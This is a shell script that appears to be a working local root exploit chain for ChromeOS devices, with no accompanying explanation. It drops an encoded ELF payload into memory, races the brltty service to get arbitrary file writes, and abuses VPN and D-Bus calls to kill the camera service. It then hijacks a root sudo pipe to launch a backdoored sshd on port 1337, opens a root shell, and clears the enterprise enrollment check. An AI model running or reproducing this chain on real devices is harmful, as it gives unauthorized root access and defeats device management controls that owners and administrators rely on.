










stage_sshd() {
        ssh-keygen -f /tmp/ssh_host_rsa_key -N '' -t rsa >/dev/null
        mkdir /tmp/root/
        cp /tmp/ssh_host_rsa_key.pub /tmp/root/k
        cat > /tmp/sshd_config <<-EOF
AuthorizedKeysFile /tmp/%u/k
StrictModes no
HostKey /tmp/ssh_host_rsa_key
Port 1337
EOF
        rm -f /home/chronos/user/.ssh/known_hosts
}

elffd() {
	sleep 1 | foomatic_shell -c '`cat`' 2>/dev/null &
	sleep 0.5
	exec 3>/proc/$!/fd/3
    base64 -d <<-EOF | bunzip2 -dc > /proc/self/fd/3
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
n/8XckU4UJAibVsE
EOF
	exec 4</proc/self/fd/3
	exec 3>&-
}

sevensbrltty(){
	TGT=$1
	/sbin/initctl stop brltty >/dev/null 2>/dev/null
	/sbin/initctl start brltty >/dev/null
	/sbin/initctl stop brltty >/dev/null

	while [ ! -w ${TGT} ]; do
		${ELF} ${TGT} &
		T=$!
		/sbin/initctl start brltty >/dev/null
		timeout 2 sh -c 'while [ ! -e /run/brltty/BrlAPI/1 ]; do :; done'
		/sbin/initctl stop brltty > /dev/null
		rm -f /run/brltty/BrlAPI/?* 2>/dev/null
		kill ${T} 2>/dev/null
	done
}

filewrite() {
	where="$1"
	what="$2"
	sevensbrltty /run/brltty
	rm -f /run/brltty/driver
	ln -s "${where}" /run/brltty/driver
	/sbin/initctl start brltty "BRLTTY_BRAILLE_DRIVER=${what}" >/dev/null
	sleep 0.5
	/sbin/initctl stop brltty >/dev/null
}

runcharon() {
    ret=$(dbus-send --fixed --print-reply --system --dest=org.chromium.flimflam / org.chromium.flimflam.Manager.ConfigureServiceForProfile objpath:/profile/chronos/shill dict:string:variant:AutoConnect,boolean:true,GUID,string:$(uuidgen),L2TPIPsec.ClientCertID,string:,L2TPIPsec.ClientCertSlot,string:,L2TPIPsec.LCPEchoDisabled,string:false,L2TPIPsec.PIN,string:,L2TPIPsec.PSK,string:pskpassword,L2TPIPsec.Password,string:userpassword,L2TPIPsec.User,string:username,Name,string:exploit,ONCSource,string:None,Priority,int32:0,Profile,string:/profile/chronos/shill,Provider.Host,string:127.0.0.1,Provider.Type,string:l2tpipsec,SaveCredentials,boolean:false,Type,string:vpn)

    dbus-send --print-reply --system --dest=org.chromium.flimflam ${ret} org.chromium.flimflam.Service.Connect >/dev/null 2>&1
    echo ${ret}
}

disconnectvpn() {
    path=$1
    dbus-send --print-reply --system --dest=org.chromium.flimflam ${path} org.chromium.flimflam.Service.Disconnect >/dev/null 2>&1
    dbus-send --print-reply --system --dest=org.chromium.flimflam ${path} org.chromium.flimflam.Service.Remove >/dev/null 2>&1
}

killpid() {
    PID=$1
    while [ -d /proc/${PID} ]; do
        path=$(runcharon)
        sleep 1
        filewrite /run/ipsec/charon.pid ${PID}
        disconnectvpn ${path}
        sleep 1
    done
}




echo "Staging sshd..."
stage_sshd

echo "Acquiring elf memfd..."
elffd
ELF=/proc/self/fd/4

echo "Preparing /run/camera_tokens..."
mv /run/camera_tokens/server /run/camera_tokens/server.$$
drivefs=$(mount | grep drivefs | awk '{print $3}')/root/exploit.$$
mkdir -p ${drivefs}/server
ln -s ${drivefs}/server /run/camera_tokens/server
pkill -STOP drivefs

echo "Killing cros_camera_server..."
killpid $(pidof cros_camera_service)

echo "Waiting for pipe..."
while [ -z "${ppid}" ]; do
    ppid=$(ps ax -o ppid,cmd | grep '[s]udo.*mkdir.*/run/camera_tokens/server' | awk '{print $1}')
    sleep 0.5
done

echo "Appending to pipe..."
TGT=/proc/${ppid}/fd/10
filewrite ${TGT} "/usr/sbin/sshd -f /tmp/sshd_config"
pkill -CONT drivefs

echo "Tidying up..."
rm -rf ${drivefs}
rm /run/camera_tokens/server
sleep 1
ssh -o StrictHostKeyChecking=no -i /tmp/ssh_host_rsa_key -p 1337 root@127.0.0.1 rm -rf "/run/camera_tokens/server /run/brltty"

echo "Providing root shell..."
ssh -o StrictHostKeyChecking=no -i /tmp/ssh_host_rsa_key -p 1337 root@127.0.0.1 vpd -i RW_VPD -s check_enrollment=0
ssh -o StrictHostKeyChecking=no -i /tmp/ssh_host_rsa_key -p 1337 root@127.0.0.1 echo "Done! Now powerwash your chromebook"
